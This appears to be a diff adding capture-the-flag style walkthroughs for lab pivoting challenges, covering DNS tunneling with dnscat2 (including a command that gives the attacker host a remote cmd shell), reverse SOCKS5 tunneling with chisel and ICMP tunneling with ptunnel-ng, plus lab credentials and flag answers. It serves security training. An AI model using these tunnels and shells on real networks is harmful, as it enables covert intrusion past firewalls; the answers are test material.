@@ -12,6 +12,10 @@
     2. [SSH Pivoting with Sshuttle](#ssh-pivoting-with-sshuttle)
     3. [Web Server Pivoting with Rpivot](#web-server-pivoting-with-rpivot)
     4. [Port Forwarding with Windows Netsh](#port-forwarding-with-windows-netsh)
+4. [Branching Out Our Tunnels](#branching-out-our-tunnels)
+    1. [DNS Tunneling with Dnscat2](#dns-tunneling-with-dnscat2)
+    2. [SOCKS5 Tunneling with Chisel](#socks5-tunneling-with-chisel)
+    3. [ICMP Tunneling with SOCKS](#icmp-tunneling-with-socks)
 
 ## Introduction
 ### Challenges
@@ -196,3 +200,103 @@
     xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
     ```
     Then we can explore to get the answer. The answer is `Jim Flipflop`.
+
+## Branching Out Our Tunnels
+### DNS Tunneling with Dnscat2
+#### Tools
+1. dnscat2
+#### Challenges
+1. Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.
+
+    To solve this, first we need to make sure we have dnscat2 tools including dnscat2.ps1. In our attack host, we make `parrotshare` folder. It will used to transfer `dnscat2.ps1` from our attack host to target host. Then we do rdp to the target.
+
+    ```bash
+    xfreerdp /v:10.129.128.110 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore /dynamic-resolution "/drive:parrotshare,/home/user/parrotshare"
+    ```
+    In our attack host, we set up the listener.It also will prodouced secret.
+
+    ```bash
+    sudo ruby dnscat2.rb --dns host=10.10.14.131,port=53,domain=inlanefreight.local --no-cache
+    ```
+    ![alt text](Assets/Tunneling1.png)
+
+    Based on that, the secret is `90fe5698ce55aae945aa407a8cc36da2`. Now we go to target host then executed `dnscat2.ps1` with that secret.
+    
+    ```powershell
+    Start-Dnscat2 -DNSserver 10.10.14.131 -Domain inlanefreight.local -PreSharedSecret 90fe5698ce55aae945aa407a8cc36da2 -Exec cmd
+    ```
+
+    ![alt text](Assets/Tunneling2.png)
+
+    If its success, our attack host will catch it. Then we can change to shell session by typing `window -i 1`. We can get the flag by using `type`.
+
+    ```powershell
+    type C:\Users\htb-student\Documents\flag.txt
+    ```
+    The answer is `AC@tinth3Tunnel`.
+
+### SOCKS5 Tunneling with Chisel
+#### Tools
+1. chisel
+#### Challenges
+1. Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.
+
+    To solve this, we need `chisel` tools. In here i used `chisel_1.9.1_linux_amd64` version. I also used reverse option to increase success chance because of firewall.
+
+    ```bash
+    wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+    ```
+    We need to modify `/etc/proxychains.conf`. Here the configuration.
+
+    ![alt text](Assets/Tunneling3.png)
+
+    After we copy the file into the pivot host, maybe using scp, we can run chisel server in our attack host.
+
+    ```bash
+    sudo ./chisel_1.9.1_linux_amd64 server --reverse -v -p 1234 --socks5
+    ```
+    Then in our pivot host, we can run chisel client.
+
+    ```bash
+    ./chisel_1.9.1_linux_amd64 client -v 10.10.14.131:1234 R:socks
+    ```
+
+    ![alt text](Assets/Tunneling4.png)
+
+    If its success, our server will catch it. Then we rdp to the target by using `proxychains`.
+
+    ```bash
+    proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+    ```
+    The answer is `Th3$eTunne1$@rent8oring!`.
+
+### ICMP Tunneling with SOCKS
+#### Tools
+1. ptunnel-ng
+#### Challenges
+1. Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer.
+
+    To solve this, we can use `ptunnel-ng` with static build. We should add `socks4 127.0.0.1 9050` into `/etc/proxychains.conf`. In our pivot host, we can execute `ptunnel-ng` with this command.
+
+    ```bash
+    sudo ./ptunnel-ng -r10.129.202.64 -R22
+    ```
+
+    Then in our attack host, we can execute `ptunnel-ng` with this command.
+
+    ```bash
+    sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+    ```
+
+    After that, we can enable dynamic port forwarding over ssh.
+
+    ```bash
+    ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+    ```
+
+    Then we can RDP to the target by using proxychains.
+    ```bash
+    proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+    ```
+
+    The answer is `N3Tw0rkTunnelV1sion!`.
